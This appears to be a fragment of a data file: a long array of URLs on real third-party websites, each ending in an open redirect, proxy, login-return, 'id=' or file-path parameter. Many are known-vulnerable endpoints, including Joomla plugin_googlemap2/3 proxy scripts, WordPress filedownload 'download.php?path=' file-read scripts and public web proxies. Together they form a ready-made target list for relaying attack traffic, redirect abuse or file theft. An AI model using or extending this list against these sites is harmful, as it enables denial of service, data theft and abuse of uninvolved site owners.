"http://www.babalweb.net/ar/open.php?url=",
"http://cicloenergia.co/open.php?url=",
"http://www.presse-algerie.net/open.php?url=",
"http://creation.com/redirect.php?urlredirect.php?url=",
"http://www.olelo.hawaii.edu/redirect.php?url=",
"http://educ.forumalgerien.org/open.php?url=",
"http://www.pbcorporate.com.sg/redir.php?url=",
"http://ezinemark.com/goto.php?url=",
"http://bid4airtime.com/viewfaqs.php?cat=",
"http://www.bariatricacr.com/modules/info/index.php?id=",
"http://www.brimat.com/cat/product/redir.php?url=",
"http://www.animelatino.org/tracker/redir.php?url=",
"http://site.vagas.com.br/oi?url=",
"http://jump.2ch.net/?img.theqoo.net/proxy.php?url=",
"http://ec.europa.eu/transparencyregister/public/homePage.do?redir=",
"http://www.aruba.com/?redirect=",
"http://www.inbox.com/login.aspx?redir=",
"http://www.cruiselinesjobs.com/redirect.php?url=",
"http://www.arabportal.net/redirect.php?url=",
"http://www.laminex.com.au/?goto=",
"https://www2.bancobrasil.com.br/aapf/login.jsp?url=",
"http://www.dyn.com.ar/?pagina=",
"http://3sh.jp/wp-content/themes/forAndroid/redirect.php?url=",
"http://chat4.fidion.de/redirect.php?url=",
"http://factory.rayongz.com/redirect.php?url=",
"http://writology.com/redirect.php?url=",
"http://www.musicinsurance.net/redirect.php?url=",
"http://anonghostuniversity.ownwap.eu/redirect.php?url=",
"http://www.shnflac.net/redirect.php?url=",
"http://hamann-russia.ru/open.php?url=",
"http://guide-dz.com/open.php?url=",
"http://starabe.com/times2/open.php?url=",
"http://www.sciencedz.net/open.php?url=",
"http://baraja.cz/open.php?url=",
"http://meka-bogensport.de/open.php?url=",
"http://bioremede.com/open.php?url=",
"http://www.carrapide.com/redirect.php?url=",
"http://163.13.175.7/dis/open.php?url=",
"http://www.whatspk.com/wallpapers/all/open.php?url=",
"http://www.teenworld.dk/galleri/open.php?url=",
"http://help.storylogue.com/open.php?url=",
"http://www.juncao.com.br/url.php?url=",
"http://www.getjetso.com/forum/url.php?url=",
"http://www.buyuknet.com/url.php?url=",
"http://www.0595rc.com/user/url.php?url=",
"http://www.rmdhw.com/url.php?url=",
"http://www.airparts.us/catalog/url.php?url=",
"http://jump.2ch.net/?yellow.ribbon.to/~mirror/url.php?url=",
"http://www.10and9.com/url.php?url=",
"http://www.francetoner.fr/identification.php?redir=",
"http://www.sladur.com/login.php?redir=",
"http://www.drewniana.malopolska.pl/?page=",
"http://www.animacje.krzysiek.biz/?url=",
"http://www.fawag.pl/index.php?goto=",
"http://ko.poznan.pl/?page=",
"http://eu.dakine.com/Home/SelectRegion?returnUrl=",
"http://www.orange.pl/klienci_biz/telefony?footerlink=",
"http://zuribikes.com/?uri=",
"http://www.google.com/ig/adde?moduleurl=",
"http://sso.amorepacific.com/sso/sessioncheck.jsp?returnUrl=",
"http://www.skepticalscience.com/redirect.php?u=",
"http://www.src-srpg.jpn.org/srcweb/rulechecker/rulecheck.cgi?url=",
"http://wersam.npage.de/request_unblock.php?uri=",
"http://www.purificadordeaguasalvador.com.br/?uri=",
"http://www.econeteditora.com.br/?url=",
"http://validator.w3.org/nu/?doc=",
"http://im.ufrj.br/~maurizio.monge/kanjax/proxy.php?url=",
"https://seguro.cesgranrio.org.br/login.aspx?returnurl=",
"http://www.scafco.com/proxy.php?url=",
"http://validator.w3.org/check?uri=",
"http://realroi.ru/req/util/proxy.php?url=",
"http://www.stmg.nl/index.php?id=",
"http://www.feedvalidator.org/check.cgi?url=",
"http://www.dekinderwerkplaats.nl/index.php?url=",
"http://www.svcolmschate.nl/news.php?id=",
"http://feedvalidator.org/check.cgi?url=",
"http://gmodules.com/ig/creator?url=",
"http://www.123zaden.nl/pages.php?id=",
"http://g-pz.com/gallery/gallery.php?id=",
"http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://validator.w3.org/p3p/20020128/p3p.pl?uri=",
"http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://film-addiction.net/proxy.php?url=",
"http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://validator.w3.org/mobile/check?docAddr=",
"http://web-sniffer.net/?url=",
"http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://covraag.nl/derma/proxy.php?url=",
"http://www.arantzabelaikastola.com/webgunea/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.bergenpol.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://services.w3.org/tidy/tidy?docAddr=",
"http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://apidock.com/rails/ActionController/Base/redirect_toredirect=",
"http://grabpage.info/t/jigsaw.w3.org/css-validator/validator?uri=",
"http://www.doe.mass.edu/cms/sites/all/modules/ckeditor_link/proxy.php?url=",
"http://www.idace.ce.gov.br/sitio/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://joat.co/index.php?url=",
"http://www.definitions.net/definition/paginapagina=",
"http://www.evallor.com/redirection.php?url=",
"http://www.dawnbreaker.com/doephase0/redirect.php?url=",
"http://library.savannahstate.edu/mobile/proxy.php?url=",
"http://linkturk.com/link/index.php?url=",
"http://www.rssletter.com/OnlineRssViewer/Channel=",
"http://jump.2ch.net/?www.brandnewdays.net/ruby/checker/check.cgi?url=",
"http://www.akwaibomnewsonline.com/news/index.php?url=",
"http://alkowebizer.sk/engine.php?url=",
"http://extra.agea.com/templates/extra_agea/ss_proxy.php?url=",
"http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=",
"http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://es.laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.w3.org/services/tidy?docAddr=",
"http://www.prguitarman.com/index.php?id=",
"http://www.afriphoto.com/expositions_gallery.php?id=",
"http://www.digimindsoft.com/fr/cart.php?id=",
"http://www.tidytowns.ie/interior.php?id=",
"http://www.henokiens.com/content.php?id=",
"http://www.chateaudesthermes.be/basket.php?id=",
"http://www.pixheaven.net/galerie_us.php?id=",
"http://old.mirf.ru/articles.php?id=",
"http://wayne.cool/redirect.php?data=",
"http://galleries.destinymoody.com/65_heidi/index.php?id=",
"http://chenxuehu.com/wp-content/themes/begin/inc/go.php?url=",
"http://www.movescount.com/?signin&amp;redirect_uri=",
"http://speakerplans.com/index.php?id=",
"http://www.evilution.co.uk/index.php?id=",
"http://www.nobelprize.org/mediaplayer/index.php?id=",
"http://www.tonostano.com/index.php?id=",
"http://www.rcrevolution.net/portal/modules/tinyd0/index.php?id=",
"http://www.milano.aci.it/index.php?id=",
"http://whatspk.com/wallpapers/all/open.php?url=",
"http://www.refreshthing.com/index.php?url=",
"http://shop.netbynet.ru/index.php?id=",
"http://www.hamann-russia.ru/open.php?url=",
"http://adm.rkursk.ru/index.php?id=",
"http://www.communicationforsocialchange.org/mazi-articles.php?id=",
"http://www.integrativetherapy.com/se/articles.php?id=",
"http://www.trippermap.com/gmap/gmap.php?id=",
"http://www.iscintelligence.com/event.php?id=",
"http://agriculture.com.vn/commodities.php?id=",
"http://musicov.me/?song=",
"http://www.theoangelopoulos.gr/newsone.php?id=",
"http://www.bdtheque.com/forum_bds.php?num=",
"http://www.coral-shop.com/news.php?id=",
"http://www.hoyukaitulsa.org/gallery/gallery.php?id=",
"http://www.szephazak.hu/gallery/gallery.php?id=",
"http://www.otohaya.com/gallery/gallery.php?id=",
"http://ehime-npo.org/gallery/gallery.php?id=",
"http://www.rererenore.jp/gallery/gallery.php?id=",
"http://www.organelle.jp/gallery/gallery.php?id=",
"http://www.aquatype.com/gallery/gallery.php?id=",
"http://rise-consultant.jp/gallery/gallery.php?id=",
"http://thesilvercutter.com/gallery/gallery.php?id=",
"http://www.temeculainformation.com/classified/view_items.php?id=",
"http://www.jk-n.com/gallery/gallery.php?id=",
"http://www.ikejiri.biz/gallery/gallery.php?id=",
"http://chomogirls.lolipop.jp/gallery/gallery.php?id=",
"http://www.mitsuda.biz/gallery/gallery.php?id=",
"http://rockabirity.co.jp/gallery/gallery.php?id=",
"http://starkom.eu/bazar/view_items.php?id=",
"http://mahhasou.com/gallery/gallery.php?id=",
"http://belfo.com.ua/products.php?type=",
"http://www.ashita.net/gallery/gallery.php?id=",
"http://www.adammillertoyandbicycle.com/products.php?type=",
"http://www.bikersoracle.com/auction/view_items.php?id=",
"http://www.aihiroko.com/gallery/gallery.php?id=",
"http://www.atalantacorp.com/products.php?type=",
"http://ayabe-eitai.net/gallery/gallery.php?id=",
"http://cmpauction.thecmp.org/detail.asp?id=",
"https://www.minzdrav.uz/en/news/detail.php?ID=",
"http://trives.cc/gallery/gallery.php?id=",
"http://www.azgranitecreations.com/products.php?type=",
"http://www.tridenteng.co.uk/products.php?type=",
"http://horizonsolutions.org/products.php?type=",
"http://www.integrasys-sa.com/products.php?type=",
"http://www.marosa.net/gallery/gallery.php?id=",
"http://www.ecosem.be/fr/products.php?type=",
"http://www.rbfindustries.co.uk/healthcare/products.php?type=",
"http://selectautomart.com/view_items.php?id=",
"http://qualitekph.com/blog/products.php?type=",
"http://www.dembro.nl/products.php?type=",
"http://www.inderscience.com/dev/search/index.php?action=",
"http://www.jp-rail.com/products.php?type=",
"http://yoro49.com/gallery/gallery.php?id=",
"http://www.cellini.com.sg/html/products.php?type=",
"http://www.foiredelibramont.com/index.php?action=",
"http://www.nyis.info/index.php?action=",
"http://www.liisma.org/index.php?action=",
"http://www.simplemachines.org/community/index.php?action=",
"http://www.mothercare.com.tw/products/products.php?type=",
"http://www.wasagabeachpark.com/index.php?action=",
"http://www.dplogin.com/index.php?action=",
"http://www.xbins.org/index.php?action=",
"http://www.microlon.com.au/products/products.php?type=",
"http://www.grandprix.hk/products.php?type=",
"http://afterbeat.org/index.php?action=",
"http://www.thechinaguide.com/index.php?action=",
"http://www.eliotours.es/viajes/proxy.php?url=",
"http://www.amazon.com/Steam-Link-Pc/dp/B016XBGWAQlink=",
"http://www.nostsuspension.com/affiliates.php?id=",
"http://book.vuilen.com/book_view.php?bookid=",
"http://www.fresco-exhaust.com/shopping_cart.php?action=",
"http://n10zvalves.com/affiliates.php?id=",
"http://gastronoome.com/category.php?catid=",
"http://www.mosaicidonamurano.com/fr/ajax_shop_cart.php?id=",
"http://www.sfendocrino.org/article.php?id=",
"http://www.mbgraphic.fr/category.php?catid=",
"http://p205gti.free.fr/index.php?url=",
"http://ckthonon.free.fr/index.php?url=",
"http://www.thermocontrolstoves.com/products.php?type=",
"http://data.unhcr.org/syrianrefugees/country.php?id=",
"http://lingofox.dw.com/index.php?url=",
"http://fotokarta.info/map/map.php?url=",
"http://forums.nogooom.net/go.php?url=",
"http://stand.nalog.ru/admin/login/?url=",
"http://support.bravenet.com/mask.php?url=",
"http://forums.9carthai.com/go.php?url=",
"http://www.webpark.ru/go.php?url=",
"https://or71.ru/news/detail.php?ID=",
"http://www.ledbn.com/wp-content/themes/begin160909/inc/go.php?url=",
"http://wapblogs.eu/ejuz.php?url=",
"http://mihavxc.ru/go.php?url=",
"http://www.bose.com/prc.jsp?url=",
"http://www.aidsalliance.org.ua/cgi-bin/index.cgi?url=",
"http://www.semex.com/popurl.cgi?url=",
"http://addedtheurl.com/?url=",
"http://www.ebesucher.ru/index.php?link=",
"http://citecclub.org/forum/redirector.php?url=",
"http://www.dor.state.nc.us/downloads/forms_trad.php?url=",
"http://netmon.net.bsu.edu/noc/noc_menu.cgi?url=",
"http://www.5x5fotbalsrl.ro/index.php?link=",
"http://www.eleonor-corp.ru/index.php?link=",
"http://www.fliporium.com/website/redirect.php?url=",
"http://www.anpcdefp.ro/anpcdefp.php?link=",
"http://www.skbis.ru/index.php?p=",
"http://tarmashev.com/about.php?p=",
"http://e92.ru/index.php?p=",
"http://www.kirkwood.edu/site/index.php?p=",
"https://www.kirkwood.edu/site/index.php?p=",
"http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.caafcgilsicilia.it/?id_pagina=",
"http://www.comune.taurianova.rc.it/?uri=",
"https://super2010.trenitalia.it/sl/Login/go.aspx?url=",
"http://www.professioni24.ilsole24ore.com/?page=",
"http://www.heatwalkingcycling.org/index.php?pg=",
"http://www.gotm.net/index.php?go=",
"http://www.thrombosis2016.org/index.php?go=",
"http://www.karplaw.com/index.php?go=",
"http://gbs.realwap.net/guest.php/putra.minang/www.klikvsikita.com/putra.minang/www.klikvsikita.com/cpanel.php?id=",
"http://fresno.steinwaydealer.com/index.php?go=",
"http://www.veithsymposium.org/index.php?pg=",
"http://sfpl.org/index.php?pg=",
"http://www.zikgu.info/search.php?go=",
"http://www2.vcdh.virginia.edu/cem/person-search.php?go=",
"http://www.budogu.jp/cart/syscheck.cgi?url=",
"http://www.mytaxcollector.com/trsearch.aspx?redir=",
"http://support.lexmark.com/index?page=",
"http://www.cssprogram.net/?page=",
"http://www.muribeachclubhotel.com/?uri=",
"http://opencart.ws/forum/away.php?s=",
"http://www.php.net/de/control-structures.goto.phpgoto=",
"http://gmod-fan.ru/forum/away.php?s=",
"http://dle.in.ua/talk/away.php?s=",
"http://kindle-fire.in.ua/forum/away.php?s=",
"http://minecraft-rus.ru/forum/away.php?s=",
"http://www.1national.ru/away.php?url=",
"http://forum.my-yo.ru/away.php?s=",
"http://forum.ostereo.ru/away.php?s=",
"http://dota2.ru/away.php?to=",
"http://www.aktau-business.com/forum/away.php?s=",
"http://www.invalirus.ru/forum/away.php?s=",
"http://santcom63.ru/forum/away.php?s=",
"http://www.vueltaachihuahua.com/2009/proxy.php?url=",
"http://www3.truecorp.co.th/auth/auth_ssov2/logout?redirect_uri=",
"http://www.myappwiz.info/home/redirect?targetUrl=",
"http://myappwiz.cloudapp.net/home/redirect?targetUrl=",
"http://cs.joensuu.fi/pages/bednarik/UE2006/rssgenr8.php?pageurl=",
"http://www.endtimescoming.com/articles.php?PageURL=",
"https://laboutiquepuget.fr/login/fwd?redirect_uri=",
"http://www.unisigma.com/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=",
"http://www.broadridge.com/templates/BR%20Email%20This?pageURL=",
"http://www.ubidoca.com/_en/print.php?pageURL=",
"http://www.meac.fr/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=",
"http://www.expandis.coop/bibliressources/pagessystem/iframepage.aspx?pageurl=",
"http://www.isagri.es/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=",
"http://www.tecnor-sofac.fr/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=",
"http://www.acv8.fr/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=",
"http://www.agylin.fr/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=",
"http://www.berthoud.com/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=",
"http://it.groupeisa.com/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=",
"http://www.isagri.pt/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=",
"http://jescobedo.com/wp-content/themes/dt-chocolate/like_window.php?img=",
"http://richardknightly.com/wp-content/themes/dt-chocolate/like_window.php?img=",
"http://www.molineroava.com/en/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://loycetranchant.com/wp-content/themes/dt-chocolate/like_window.php?img=",
"http://webmail.aliceadsl.fr/horde/util/go.php?url=",
"http://www.amphotography.us/wp-content/themes/dt-chocolate/like_window.php?img=",
"http://khalilyassirphotos.com/wp-content/themes/dt-chocolate/like_window.php?img=",
"http://www.hylands-tkat.org/account/login?redir=",
"http://www.iris.edu/hq/accounting/login?redir=",
"http://recuperos.com.br/login?redir=",
"http://www.hispamoda.com/login?redir=",
"http://www.karimbenamor.com/goto/index.asp?goto=",
"http://latinamerica.brother.com/LeavingOurSite.aspx?GoTo=",
"http://www.zanzana.net/goto.asp?goto=",
"http://autoplanet1.com/redirect?goto=",
"http://www.boyscouttrail.com/external_frame.asp?goto=",
"http://www.fif-orientering.dk/fif/index.asp?goto=",
"http://www.ustinova.ru/bitrix/rk.php?goto=",
"http://www.bcs-urec.ru/bitrix/rk.php?goto=",
"http://www.koreandramafc.com/out/?goto=",
"http://www.mckenzieinstitute.org/Security/login?BackURL=",
"http://paceteam.ca/Security/login?BackURL=",
"http://www.kurtztrucking.com/Security/login?BackURL=",
"http://opencompute.org/Security/login?BackURL=",
"http://cesa.org/Security/login?BackURL=",
"http://www.skylineonline.ca/Security/login?BackURL=",
"http://w.scriptcoach.com/Security/login?BackURL=",
"http://www.globalgenerator.co.uk/Security/login?BackURL=",
"http://www.sparkscience.ca/Security/login?BackURL=",
"http://www.nad.org.nz/Security/login?BackURL=",
"http://www.edchipman.ca/Security/login?BackURL=",
"http://www.library.umass.edu/Security/login?BackURL=",
"http://en.devialet.com/Security/login?BackURL=",
"http://www.odysseywallcoverings.com/Security/login?BackURL=",
"http://www.dombinnov.fr/Security/login?BackURL=",
"http://www.nzieh.org.nz/Security/login?BackURL=",
"http://www.crcsi.com.au/Security/login?BackURL=",
"https://www.sustainableplant.com/Security/login?BackURL=",
"http://www.savannahgroup.com.au/Security/login?BackURL=",
"http://www.roundhouse.org.uk/Security/login?BackURL=",
"http://smbe2016.org/Security/login?BackURL=",
"http://www.indiainfoline.com/user/login?backurl=",
"https://www.jobsinlifesciences.com/jobs/login?BackURL=",
"http://www.milkeneducatorawards.org/Security/login?BackURL=",
"http://www.siddharthasintent.org/Security/login?BackURL=",
"https://www.glenfiddich.com/Security/login?BackURL=",
"https://www.kingsway.co.uk/Security/login?BackURL=",
"http://gymkengymnastics.com/Security/login?BackURL=",
"https://www.eat.co.nz/Security/login?BackURL=",
"http://www.olivefarmwines.com/Security/login/login?BackURL=",
"http://silverstripe-foundation.com/Security/login?BackURL=",
"https://www.uk-assignments.com/Security/login?BackURL=",
"https://www.cciq.com.au/Security/login?BackURL=",
"http://www.montereycountypops.org/Security/login?BackURL=",
"http://www.radimage.info/Security/login?BackURL=",
"http://www.genesis-marine.com/Security/login?BackURL=",
"http://www.ceda.co.uk/Security/login?BackURL=",
"http://www.internal-displacement.org/Security/login?BackURL=",
"http://gdflyfishing.fredweb.geek.nz/Security/login?BackURL=",
"http://repcoii.com/Security/login?BackURL=",
"http://learningstaircase.co.nz/Security/login?BackURL=",
"http://www.bpa.org.uk/Security/login?BackURL=",
"http://www.queensclub.com.au/Security/login?BackURL=",
"http://www.leifproducts.com/Security/login?BackURL=",
"http://www.raca.com.au/Security/login?BackURL=",
"http://spell-write.nz/Security/login?BackURL=",
"http://www.theatreroyal.com/Security/login?BackURL=",
"http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=",
"http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.keenecinemas.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.hotelmonyoli.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://prosperitydrug.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://policlinicamonteabraao.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.vetreriafasanese.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.benawifi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.valleyview.sa.edu.au/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.racersedgekarting.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.villamagnoliarelais.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://worldwide-trips.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.netacad.lviv.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.veloclub.ru/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.virtualsoft.pl/plugins/content/plugin_googlemap3_proxy.php?url=",
"http://gminazdzieszowice.pl/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.fare-furore.com/com-line/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.rotisseriesalaberry.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.lbajoinery.com.au/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.seebybike.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.copiflash.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.netvibes.com/subscribe.php?url=",
"http://suttoncenterstore.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www-test.cisel.ch/web/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.sistem5.net/ww/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.fmradiom.hu/palosvorosmart/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.iguassusoft.com/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://lab.univ-batna.dz/lea/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.computerpoint3.it/cp3/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://hotel-veles.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://klaassienatuinstra.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.demarcation.org.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://tv1861.net/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.idace.ce.gov.br/sitio/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://ncs3.prohost.pl/ESTO/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://services.w3.org/tidy/tidy?docAddr=",
"http://bao-sushi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.limitless-coiffure.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://finnrelax.hu/fitnesz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://hotelsixty3.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.dimensionebimbi.it/DB/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.molineroava.com/en/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://adeptlock.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://voda.dn.ua/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.ecocenter-vg.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://econom.govvrn.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.sandp.co.th/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.theatredebelleville.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://cnnp.if.ua/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://loretta-altabadia.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://trolebus.gob.ec/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.polarissupreme.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://coastalcenter.net/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://whitehousesurgery.org/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.vertexi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.owl.cat/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.sizzlebistro.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://thebluepine.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://donellis.ie/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.aquariitech.com/Security/login?BackURL=",
"http://www.workchoice.co.nz/Security/login?BackURL=",
"http://www.akentishceremony.com/Security/login?BackURL=",
"http://www.fosterconversation.com/Security/login?BackURL=",
"http://www.centerforirishmusic.org/Security/login?BackURL=",
"http://infotechenterprises.com/Security/login?BackURL=",
"http://www.archbishopholgates.org/Security/login?BackURL=",
"http://www.vxsport.com/Security/login?BackURL=",
"http://motatapu.com/Security/login?BackURL=",
"http://www.alexandraclub.com.au/Security/login?BackURL=",
"http://www.pilatesfoundation.com/Security/login?BackURL=",
"http://www.chillout.co.nz/Security/login?BackURL=",
"http://www.warwickartscentre.co.uk/Security/login?BackURL=",
"http://ecvd.org/Security/login?BackURL=",
"http://51.195.43.90/"
"http://www.add.com/",
"http://67.201.33.9",
"http://51.195.102.120/",
"http://www.proxy2016.top/index.php?q=",
"http://www.proxy2017.top/index.php?q=",
"http://ntc-convention.com.ua/wp-content/plugins/filedownload/download.php?path=",
"http://tikoblog.de/wp-content/plugins/filedownload/download.php?path=",
"http://i4ultimate.com/wp-content/plugins/filedownload/download.php?path=",
"http://nets.16mb.com/wp-content/plugins/filedownload/download.php?path=",
"http://phidiastavern.com/wp-content/plugins/filedownload/download.php?path=",
"http://noorussabahresidency.com/wp-content/plugins/filedownload/download.php?path=",
"http://vims-geo.ru/wp-content/plugins/filedownload/download.php?path=",
"http://ent-graz.com/wordpress/wp-content/plugins/filedownload/download.php?path=",
"http://cathygnarchdiocese.org/wp-content/plugins/filedownload/download.php?path=",
"http://dundalktidytowns.com/wp-content/plugins/filedownload/download.php?path=",
"http://bh.kbs6.de/wp-content/plugins/filedownload/download.php?path=",
"http://conference-research.com/wp-content/plugins/filedownload/download.php?path=",
"http://ghostproxy.eu/browse.php?u=",
"http://yavz.xyz/b.php?u=",
"http://iwaz.gq/browse.php?u=",
"http://shinyproxy.com/browse.php?u=",
"http://bypasstool.gq/browse.php?u=",
"http://blackjacklive.de/wp-content/plugins/filedownload/download.php?path=",
"http://buehler-hartmetall.de/BuehlerHartmetallEX/wp-content/plugins/filedownload/download.php?path=",
"http://audytpavlenko.com.ua/wp-content/plugins/filedownload/download.php?path=",
"http://talevtechnology.com/bg/wp-content/plugins/filedownload/download.php?path=",
"http://drlindaskincare.com/wp-content/plugins/filedownload/download.php?path="
"http://cadmm.org/wp-content/plugins/filedownload/download.php?path=",
"http://decktours.de/portal/content/wp-content/plugins/filedownload/download.php?path=",
"http://psychotherapie-dr-maeng.de/wp-content/plugins/filedownload/download.php?path=",
"http://diskont.at/wp-content/plugins/filedownload/download.php?path=",
"http://parador-online.de/wp-content/plugins/filedownload/download.php?path=",
"http://theparkshelton.com/wp-content/plugins/filedownload/download.php?path=",
"http://jazzdrummerworld.com/wp-content/plugins/filedownload/download.php?path=",
"http://enlivendesigns.us/wp-content/plugins/filedownload/download.php?path=",
"http://kanzlei-ronnenberg.de/wp-content/plugins/filedownload/download.php?path=",
"http://earthday.ca/wp-content/plugins/filedownload/download.php?path=",
